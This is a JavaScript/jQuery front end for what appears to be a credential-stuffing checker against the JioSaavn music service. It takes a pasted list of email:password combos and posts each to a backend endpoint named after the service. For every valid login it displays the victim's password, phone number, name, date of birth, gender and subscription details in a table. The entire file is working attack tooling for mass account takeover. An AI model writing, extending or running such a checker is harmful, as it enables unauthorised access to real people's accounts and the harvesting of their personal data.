var splited;
$( document ).ready(function() {
    $("#submitForm").click(function(){
        var textArea = $("#accounts").val();
         splited = textArea.split("\n").map(e=>e.split(' ')[0]).filter(e=>validateEmail(e.split(':')[0]));
        promises(splited.map(e=>e.split(' ')[0]),0);
        console.log("splited",splited);

    });
});

function promises(arr,i){
    if(i === arr.length)
        return;
    $.post(
        {
            type:'POST',
            url:'services/jiosaavn',
            contentType: 'application/json',
            data: JSON.stringify({
                login:arr[i].split(":")[0],
                password:arr[i].split(":")[1]
            }),
            success: function(data) {
                promises(arr,i+1);
                console.log('post success');
                console.log(JSON.stringify(data));
                prependerModified(data);
            },
            error: function(data) {
                promises(arr,i+1);
                console.log('post error');
                console.log(JSON.stringify(data));
            }
        }
    )
    $('#progressBar').css('width',(i+1) / splited.length * 100 +"%");

}



function prependerModified(account) {
    var
        email = account.accountLogin.email,
        password = account.accountLogin.password,
        phone_number = 'X',
        status='X',
        lastname='X',
        firstname='X',
        gender='X',
        dob= 'X',
        birthyear='X',
        following_count='X',
        follower_count='X',
        paywall_only='X',
        loginwall='X',
        offer_trial='X',
        expiration_timestamp='X',
        pro_features='X',
        tier_id='X',
        title='X',
        subtitle='X',
        auto_renewal='X',
        storage_limit='X',
        device_limit='X',
        period='X',
        autorenew_text='X'
    ;
    if (account.validAccount) {
            phone_number = account.accountInfo.data.phone_number;
            status=account.accountInfo.data.status;
            lastname=account.accountInfo.data.lastname;
            firstname=account.accountInfo.data.firstname;
            gender=account.accountInfo.data.gender;
            dob= account.accountInfo.data.dob;
            birthyear=account.accountInfo.data.birthyear;
            following_count=account.accountInfo.data.following_count;
            follower_count=account.accountInfo.data.follower_count;
            paywall_only=account.accountInfo.data.paywall_only;
            loginwall=account.accountInfo.data.loginwall;
            offer_trial=account.accountInfo.prostatus.offer_trial;
            expiration_timestamp=account.accountInfo.prostatus.expiration_timestamp;
            pro_features=account.accountInfo.prostatus.pro_features;
            tier_id=account.accountInfo.prostatus.tier_id;
            title=account.accountInfo.prostatus.title;
            // subtitle=account.accountInfo.prostatus.subtitle;
            auto_renewal=account.accountInfo.prostatus.auto_renewal;
            storage_limit=account.accountInfo.prostatus.product_details.storage_limit;
            device_limit=account.accountInfo.prostatus.product_details.device_limit;
            period=account.accountInfo.prostatus.product_details.period + account.accountInfo.prostatus.product_details.period_unit;
            autorenew_text=account.accountInfo.prostatus.product_details.autorenew_text;


    }
    $('tbody').prepend('<tr>' +
        '      <th scope="row">' + account.validAccount + '</th>' +
        '      <td>' + email + '</td>' +
        '      <td>' + password + '</td>' +
        '      <td>' + phone_number + '</td>' +
        '      <td>' + status + '</td>' +
        '      <td>' + lastname + '</td>' +
        '      <td>' + firstname + '</td>' +
        '      <td>' + gender + '</td>' +
        '      <td>' + dob + '</td>' +
        '      <td>' + birthyear + '</td>' +
        '      <td>' + following_count + '</td>' +
        '      <td>' + follower_count + '</td>' +
        '      <td>' + paywall_only + '</td>' +
        '      <td>' + loginwall + '</td>' +
        '      <td>' + offer_trial + '</td>' +
        '      <td>' + expiration_timestamp + '</td>' +
        '      <td>' + pro_features + '</td>' +
        '      <td>' + tier_id + '</td>' +
        '      <td>' + title + '</td>' +
        // '      <td>' + subtitle + '</td>' +
        '      <td>' + auto_renewal + '</td>' +
        '      <td>' + storage_limit + '</td>' +
        '      <td>' + device_limit + '</td>' +
        '      <td>' + device_limit + '</td>' +
        '      <td>' + period + '</td>' +
        '      <td>' + autorenew_text + '</td>' +
        '    </tr>')

}
function validateEmail(email) {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
